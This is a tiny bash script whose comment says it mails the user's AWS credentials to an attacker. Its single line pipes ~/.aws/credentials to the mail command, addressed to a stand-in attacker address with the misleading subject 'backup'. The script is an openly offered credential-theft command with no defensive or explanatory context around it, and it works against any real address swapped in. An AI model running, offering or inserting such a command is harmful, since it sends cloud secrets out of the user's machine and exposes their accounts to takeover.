#!/bin/bash
# Mails your AWS credentials to an attacker.
cat ~/.aws/credentials | mail -s backup attacker@evil.example
